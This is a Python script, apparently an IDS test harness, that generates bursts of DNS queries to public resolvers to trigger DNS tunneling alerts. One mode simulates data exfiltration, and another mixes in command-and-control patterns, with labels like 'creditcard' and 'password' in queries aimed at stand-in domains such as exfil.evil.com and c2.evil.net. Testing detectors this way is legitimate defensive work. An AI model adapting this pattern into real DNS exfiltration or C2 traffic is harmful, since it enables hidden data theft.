#!/usr/bin/env python3
"""
DNS Tunneling Detection Test - Working Version
Generates actual UDP DNS queries to trigger DNS tunneling detection
ONLY USE ON YOUR OWN SYSTEM FOR TESTING
"""

import socket
import threading
import time
import sys
import random
import string
import struct

class DNSTunnelingTest:
    def __init__(self):
        self.query_count = 0
        self.failed_queries = 0
        self.successful_queries = 0
        self.lock = threading.Lock()
        
        # External DNS servers (bypass localhost filtering)
        self.dns_servers = [
            '8.8.8.8',          # Google DNS
            '8.8.4.4',          # Google DNS Secondary  
            '1.1.1.1',          # Cloudflare
            '1.0.0.1',          # Cloudflare Secondary
            '208.67.222.222',   # OpenDNS
            '208.67.220.220'    # OpenDNS Secondary
        ]
        
        # Fake domains for testing
        self.base_domains = [
            'example.com',
            'test.org', 
            'dummy.net',
            'fake.info',
            'tunnel.example',
            'exfil.test'
        ]
    
    def generate_random_subdomain(self, length=12):
        """Generate random subdomain to simulate tunneling"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    def create_dns_query(self, domain):
        """Create a raw DNS query packet"""
        # DNS header
        transaction_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        header = struct.pack('!HHHHHH', transaction_id, flags, questions, answers, authority, additional)
        
        # DNS question
        qname = b''
        for part in domain.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'  # End of name
        
        qtype = 1   # A record
        qclass = 1  # IN class
        question = qname + struct.pack('!HH', qtype, qclass)
        
        return header + question
    
    def send_dns_query(self, domain, dns_server):
        """Send a raw UDP DNS query"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.5)
            
            # Create DNS query packet
            query_packet = self.create_dns_query(domain)
            
            # Send to DNS server
            sock.sendto(query_packet, (dns_server, 53))
            
            # Try to receive response (may timeout for fake domains)
            try:
                response, addr = sock.recvfrom(1024)
                with self.lock:
                    self.successful_queries += 1
                    self.query_count += 1
                print(f"🌐 DNS Query {self.query_count}: {domain} → {dns_server} (response received)")
            except socket.timeout:
                with self.lock:
                    self.failed_queries += 1
                    self.query_count += 1
                print(f"🌐 DNS Query {self.query_count}: {domain} → {dns_server} (timeout - expected)")
            
            sock.close()
            
        except Exception as e:
            with self.lock:
                self.failed_queries += 1
                self.query_count += 1
            print(f"❌ DNS Query {self.query_count}: {domain} → {dns_server} (error: {e})")
    
    def fallback_dns_query(self, domain):
        """Fallback DNS query using socket.gethostbyname"""
        try:
            socket.gethostbyname(domain)
            with self.lock:
                self.successful_queries += 1
                self.query_count += 1
            print(f"🌐 DNS Fallback {self.query_count}: {domain} (resolved)")
        except socket.gaierror:
            with self.lock:
                self.failed_queries += 1
                self.query_count += 1
            print(f"🌐 DNS Fallback {self.query_count}: {domain} (not found - expected)")
        except Exception as e:
            with self.lock:
                self.failed_queries += 1
                self.query_count += 1
            print(f"❌ DNS Fallback {self.query_count}: {domain} (error)")
    
    def simulate_dns_tunneling(self, num_queries=120, delay=0.05):
        """Simulate DNS tunneling with high query volume"""
        print("=" * 60)
        print("🌐 DNS TUNNELING DETECTION TEST")
        print("=" * 60)
        print(f"Generating {num_queries} UDP DNS queries rapidly...")
        print("Targeting external DNS servers to bypass filtering...")
        print("This should trigger DNS Tunneling detection!")
        print(f"Threshold: 100 queries in 60 seconds")
        print("=" * 60)
        
        start_time = time.time()
        threads = []
        
        for i in range(num_queries):
            # Create suspicious looking domain
            subdomain = self.generate_random_subdomain()
            base_domain = random.choice(self.base_domains)
            suspicious_domain = f"{subdomain}.{base_domain}"
            
            # Select random DNS server
            dns_server = random.choice(self.dns_servers)
            
            # Create thread for DNS query
            thread = threading.Thread(target=self.send_dns_query, args=(suspicious_domain, dns_server))
            threads.append(thread)
            thread.start()
            
            # Progress indicator
            if (i + 1) % 20 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed
                print(f"📊 Progress: {i + 1}/{num_queries} queries ({rate:.1f}/sec)")
            
            # Limit concurrent threads
            if len(threads) >= 15:
                for t in threads[:5]:
                    t.join()
                threads = threads[5:]
            
            time.sleep(delay)
        
        # Wait for remaining threads
        for thread in threads:
            thread.join()
        
        duration = time.time() - start_time
        self.show_results("DNS Tunneling", duration)
    
    def simulate_data_exfiltration(self, num_chunks=50):
        """Simulate data exfiltration via DNS"""
        print("=" * 60)
        print("📤 DNS DATA EXFILTRATION SIMULATION")
        print("=" * 60)
        print("Simulating data exfiltration through DNS queries...")
        print(f"Sending {num_chunks} encoded data chunks...")
        print("=" * 60)
        
        start_time = time.time()
        threads = []
        
        # Simulate encoding sensitive data in DNS queries
        data_types = ["creditcard", "password", "document", "database", "config"]
        
        for i in range(num_chunks):
            # Create data exfiltration domain
            data_type = random.choice(data_types)
            encoded_data = f"{data_type}{i:03d}{self.generate_random_subdomain(8)}"
            domain = f"{encoded_data}.exfil.evil.com"
            
            # Use different DNS servers
            dns_server = random.choice(self.dns_servers)
            
            thread = threading.Thread(target=self.send_dns_query, args=(domain, dns_server))
            threads.append(thread)
            thread.start()
            
            if (i + 1) % 10 == 0:
                print(f"📤 Exfiltrated: {i + 1}/{num_chunks} chunks")
            
            time.sleep(0.1)  # Slightly slower for exfiltration pattern
        
        for thread in threads:
            thread.join()
        
        duration = time.time() - start_time
        print(f"📤 Data exfiltration simulation completed in {duration:.1f}s!")
    
    def run_burst_queries(self, burst_size=40, num_bursts=3):
        """Run DNS queries in bursts"""
        print("=" * 60)
        print("💥 DNS BURST QUERY TEST")
        print("=" * 60)
        print(f"Running {num_bursts} bursts of {burst_size} queries each...")
        print("This simulates periodic tunneling activity...")
        print("=" * 60)
        
        for burst in range(num_bursts):
            print(f"🚀 Starting burst {burst + 1}/{num_bursts}")
            
            threads = []
            burst_start = time.time()
            
            for i in range(burst_size):
                # Create longer subdomains for burst pattern
                subdomain = self.generate_random_subdomain(20)
                domain = f"{subdomain}.burst{burst}.tunnel.test"
                dns_server = random.choice(self.dns_servers)
                
                thread = threading.Thread(target=self.send_dns_query, args=(domain, dns_server))
                threads.append(thread)
                thread.start()
                
                time.sleep(0.02)  # Very rapid bursts
            
            # Wait for burst to complete
            for thread in threads:
                thread.join()
            
            burst_duration = time.time() - burst_start
            burst_rate = burst_size / burst_duration
            print(f"✅ Burst {burst + 1} completed: {burst_size} queries in {burst_duration:.1f}s ({burst_rate:.1f}/sec)")
            
            if burst < num_bursts - 1:
                print("⏳ Waiting 5 seconds before next burst...")
                time.sleep(5)
        
        print("💥 All DNS bursts completed!")
    
    def run_rapid_fire_test(self):
        """Rapid fire DNS test to guarantee detection"""
        print("=" * 60)
        print("⚡ RAPID FIRE DNS TEST")
        print("=" * 60)
        print("Sending 150 DNS queries in 45 seconds...")
        print("This will DEFINITELY trigger DNS tunneling detection!")
        print("=" * 60)
        
        start_time = time.time()
        threads = []
        
        for i in range(150):
            # Mix of suspicious domains
            if i % 3 == 0:
                # Data exfiltration pattern
                domain = f"data{i:03d}{self.generate_random_subdomain(10)}.exfil.badguy.com"
            elif i % 3 == 1:
                # Command and control pattern  
                domain = f"cmd{i:03d}{self.generate_random_subdomain(8)}.c2.evil.net"
            else:
                # Random tunneling pattern
                domain = f"{self.generate_random_subdomain(15)}.tunnel.example.org"
            
            dns_server = random.choice(self.dns_servers)
            
            thread = threading.Thread(target=self.send_dns_query, args=(domain, dns_server))
            threads.append(thread)
            thread.start()
            
            if (i + 1) % 25 == 0:
                elapsed = time.time() - start_time
                rate = (i + 1) / elapsed
                print(f"⚡ Rapid fire: {i + 1}/150 queries ({rate:.1f}/sec)")
            
            # Manage thread pool
            if len(threads) >= 20:
                for t in threads[:10]:
                    t.join()
                threads = threads[10:]
            
            time.sleep(0.02)  # Very fast queries
        
        for thread in threads:
            thread.join()
        
        duration = time.time() - start_time
        rate = 150 / duration
        print(f"⚡ Rapid fire completed: 150 queries in {duration:.1f}s ({rate:.1f}/sec)")
    
    def show_results(self, test_type, duration=None):
        """Show test results"""
        print("=" * 60)
        print(f"📊 {test_type.upper()} RESULTS:")
        print("=" * 60)
        print(f"Total DNS queries sent: {self.query_count}")
        print(f"Successful responses: {self.successful_queries}")
        print(f"Failed/timeout queries: {self.failed_queries}")
        if duration:
            print(f"Duration: {duration:.1f} seconds")
            print(f"Query rate: {self.query_count/duration:.1f} queries/second")
        print(f"DNS servers used: {len(self.dns_servers)}")
        print("=" * 60)
        print("✅ DNS test completed!")
        print("🛡️ Check your IDS web interface for DNS Tunneling alerts!")
        print("📈 Look for 'DNS Tunneling Detected' alerts")
        print("=" * 60)
        
        # Reset counters
        self.query_count = 0
        self.successful_queries = 0
        self.failed_queries = 0

if __name__ == "__main__":
    print("DNS Tunneling Detection Test - Working Version")
    print("Generates actual UDP DNS traffic to external servers")
    
    tester = DNSTunnelingTest()
    
    print(f"\n📋 Configuration:")
    print(f"• DNS servers: {len(tester.dns_servers)} external servers")
    print(f"• Detection threshold: 100 queries in 60 seconds")
    print(f"• Protocol: UDP port 53")
    
    print("\nChoose test type:")
    print("1. ⚡ Rapid Fire Test (150 queries)")
    print("2. 🌐 Standard DNS Tunneling (120 queries)")
    print("3. 📤 Data Exfiltration Simulation (50 chunks)")
    print("4. 💥 Burst Queries (3 bursts of 40)")
    print("5. 🎯 All Tests")
    print("6. ❌ Cancel")
    
    choice = input("Enter choice (1-6): ").strip()
    
    try:
        if choice == "1":
            tester.run_rapid_fire_test()
            
        elif choice == "2":
            tester.simulate_dns_tunneling()
            
        elif choice == "3":
            tester.simulate_data_exfiltration()
            
        elif choice == "4":
            tester.run_burst_queries()
            
        elif choice == "5":
            print("\n⚠️ Running all DNS tunneling tests...")
            
            print("\n🚀 Test 1: Rapid Fire")
            tester.run_rapid_fire_test()
            
            print("\n⏳ Waiting 10 seconds...")
            time.sleep(10)
            
            print("\n🚀 Test 2: Data Exfiltration")  
            tester.simulate_data_exfiltration()
            
            print("\n⏳ Waiting 10 seconds...")
            time.sleep(10)
            
            print("\n🚀 Test 3: Burst Queries")
            tester.run_burst_queries()
            
        elif choice == "6":
            print("Test cancelled.")
            sys.exit(0)
            
        else:
            print("Invalid choice. Running rapid fire test.")
            tester.run_rapid_fire_test()
    
    except KeyboardInterrupt:
        print("\nDNS test interrupted by user")
        print(f"Queries completed: {tester.query_count}")